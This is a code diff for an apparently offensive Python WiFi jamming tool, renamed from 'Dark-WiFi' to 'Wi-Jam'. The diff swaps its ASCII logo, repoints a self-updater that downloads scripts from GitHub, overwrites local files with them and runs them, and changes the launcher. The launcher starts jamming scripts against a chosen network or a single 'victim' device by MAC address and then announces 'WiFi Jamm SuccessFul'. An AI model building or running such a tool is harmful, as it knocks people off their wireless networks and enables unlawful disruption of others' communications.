@@ -20,14 +20,12 @@ def clr():
 def main():
     clr()
     logo="""
- __   __  ___   __          ___      __       ___      ___ 
-|"  |/  \|  "| |" \        |"  |    /""\     |"  \    /"  |
-|'  /    \:  | ||  |       ||  |   /    \     \   \  //   |
-|: /'        | |:  |       |:  |  /' /\  \    /\\  \/.    |
- \//  /\'    | |.  |    ___|  /  //  __'  \  |: \.        |
- /   /  \\   | /\  |\  /  :|_/ )/   /  \\  \ |.  \    /:  |
-|___/    \___|(__\_|_)(_______/(___/    \___)|___|\__/|___|
-
+________              ______      ___       ____________________ 
+___  __ \_____ __________  /__    __ |     / /__(_)__  ____/__(_)
+__  / / /  __ `/_  ___/_  //_/    __ | /| / /__  /__  /_   __  / 
+_  /_/ // /_/ /_  /   _  ,<       __ |/ |/ / _  / _  __/   _  /  
+/_____/ \__,_/ /_/    /_/|_|      ____/|__/  /_/  /_/      /_/   
+                                                                                                                                                                                     
    """,f"""
 ----------------------     -------------------------------
 |      SecAnon       |     |   Version : {verl}     |
@@ -42,17 +40,17 @@ def main():
 main()
 
 def update():
-    myfile = ('dark-wifi.py','core/conn.py','core/jama.py','core/jams.py' ,'core/macs.py')
+    myfile = ('wi-jam.py','core/conn.py','core/jama.py','core/jams.py' ,'core/macs.py')
     for f in myfile:
         f = str(f)
-        req = requests.get("https://raw.githubusercontent.com/HoneyPots0/Dark-WiFi/master/" + f)
+        req = requests.get("https://raw.githubusercontent.com/HoneyPots0/Wi-Jam/master/" + f)
         dat = req.text
         file = open(f, 'wb')
         file.write(dat)
         file.close()
     print('\n\t    Updated Successfull !!!')
     input('\n\tPress Enter To Run Again Wi-Jam Tool: ')
-    subprocess.call([sys.executable, 'dark-wifi.py'])
+    subprocess.call([sys.executable, 'wi-jam.py'])
 def net_update_active():
     main()
     try:
@@ -64,7 +62,7 @@ def net_update_active():
             input('\n\tPress Enter To Continue : ')
     print('\n\t\t    Checking For Updates...')
     ver_r = requests.get(
-        "https://raw.githubusercontent.com/HoneyPots0/Dark-WiFi/main/core/.version")
+        "https://raw.githubusercontent.com/HoneyPots0/Wi-Jam/main/core/.version")
     ver = ver_r.text
     try:
         verl = open("core/.version", 'r').read()
@@ -72,7 +70,7 @@ def net_update_active():
         pass
     if ver != verl:
         print('\n\t\tNew Version Available : ', ver)
-        print('\n\t\t  Dark-WiFi Tool Start Updating...')
+        print('\n\t\t  Wi-Jam Tool Start Updating...')
         update()
     print("\n\t\tYour Version is Up-To-Date")
     print('\n\t\t    Starting HPomb...\n')
@@ -159,11 +157,16 @@ if int(jam) == 2 :
     single = input("Please Victim Device Mac Address : ")
     single.strip()
     proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/jams.py {wifi_sel} {mac} {single}'  ])
+    main()
+    print(Red+f"\t\t        WiFi Jamm SuccessFul \n"+Blue)
+    input("Please Enter To Stop WiFi Jamming : ")
+    subprocess.call([sys.executable, 'core/stop.py'])
 else :
-    proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/macs.py {wifi_sel} {mac} {channel}'  ])
+    proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/dump_air.py {wifi_sel} {mac} {channel}'  ])
+    
     proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/jama.py {wifi_sel} {mac}'  ])
     main()
     print(Red+f"\t\t        WiFi Jamm SuccessFul \n"+Blue)
     input("Please Enter To Stop WiFi Jamming : ")
-    subprocess.call([sys.executable, 'stop.py'])
+    subprocess.call([sys.executable, 'core/stop.py'])
 
